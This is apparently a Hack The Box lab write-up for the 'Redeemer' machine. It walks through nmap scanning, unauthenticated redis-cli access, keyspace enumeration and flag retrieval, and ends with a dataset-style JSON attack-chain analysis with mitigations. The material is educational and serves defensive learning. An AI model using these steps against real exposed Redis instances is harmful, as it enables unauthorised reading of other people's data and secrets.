# HTB Redeemer - Redis Exposure and Keyspace Data Extraction

Scope: authorized HTB lab only.
Focus: unauthenticated Redis service discovery, server metadata extraction, keyspace enumeration, and sensitive value retrieval.

---

## 1. Investigation Objective

1. Verify reachability and identify exposed services.
2. Confirm Redis access posture (auth vs no auth).
3. Enumerate keyspace in controlled manner.
4. Extract high-value keys and evaluate follow-on risk.

---

## 2. Network and Service Enumeration

```bash
nmap -sC -sV -Pn -p- --min-rate 5000 <TARGET_IP>
```

Core finding:
- 6379/tcp open (`redis`)

Knowledge anchors:
- Redis is an in-memory database.
- `redis-cli` is the command-line client utility.

---

## 3. Redis Access Validation

Connect:

```bash
redis-cli -h <TARGET_IP> -p 6379
```

Collect server metadata:

```text
info
info server
info keyspace
```

Typical version observation in this machine path:
- `redis_version:5.0.7`

---

## 4. Keyspace Enumeration and Data Retrieval

Switch database and list keys:

```text
select 0
keys *
```

Inspect values based on key type:

```text
type <key>
get <string_key>
hgetall <hash_key>
lrange <list_key> 0 -1
```

Safer iterative enumeration option:

```text
scan 0 match * count 100
```

---

## 5. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -p- --min-rate 5000 10.129.XX.XX
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

analyst@kali:~$ redis-cli -h 10.129.XX.XX -p 6379
10.129.XX.XX:6379> info keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0

10.129.XX.XX:6379> select 0
OK
10.129.XX.XX:6379> keys *
1) "temp"
2) "stor"
3) "numb"
4) "flag"

10.129.XX.XX:6379> get flag
"HTB{...flag...}"
```

---

## 6. Analyst Reasoning Chain (Dataset-Style)

```json
{
  "scenario": "redeemer_unauthenticated_redis_key_extraction",
  "input_signals": [
    "Redis service exposed on 6379/tcp",
    "Client connection succeeded without authentication prompt",
    "Keyspace db0 contains multiple readable keys",
    "Flag/sensitive value retrievable via GET"
  ],
  "attack_chain": [
    {
      "step": 1,
      "tactic": "reconnaissance",
      "technique": "Service Discovery",
      "confidence": 0.97,
      "evidence": "nmap identified redis service and version"
    },
    {
      "step": 2,
      "tactic": "initial_access",
      "technique": "Exposed Data Service Misconfiguration",
      "confidence": 0.95,
      "evidence": "redis-cli connected without AUTH requirement"
    },
    {
      "step": 3,
      "tactic": "collection",
      "technique": "Data from Information Repositories",
      "confidence": 0.92,
      "evidence": "keys enumerated and sensitive key value extracted"
    }
  ],
  "hypotheses": [
    "Additional keys may contain credentials, tokens, or internal hostnames",
    "Redis secrets may be reused by external-facing services",
    "Dangerous Redis commands could enable host-level pivot if unrestricted"
  ],
  "uncertainties": [
    "Unknown if write operations or CONFIG changes are permitted",
    "Persistence settings and replication scope not validated",
    "No evidence of connection throttling or access logging"
  ],
  "tool_calls": [
    {"name": "redis_key_classifier", "priority": "high"},
    {"name": "redis_auth_posture_auditor", "priority": "high"},
    {"name": "secret_reuse_validator", "priority": "medium"}
  ],
  "mitigation": {
    "immediate": [
      "Enable Redis authentication/ACL and rotate exposed secrets",
      "Restrict 6379 to private management networks only",
      "Disable dangerous administrative commands for untrusted clients"
    ],
    "hardening": [
      "Bind Redis to localhost/private interfaces",
      "Enforce network ACL/firewall policy for cache/data tiers",
      "Store secrets in dedicated secret manager instead of plaintext values"
    ],
    "monitoring": [
      "Alert on external Redis connections and bulk key enumeration",
      "Detect suspicious use of KEYS/SCAN across large keyspaces",
      "Track anomalous read patterns for sensitive key namespaces"
    ]
  }
}
```




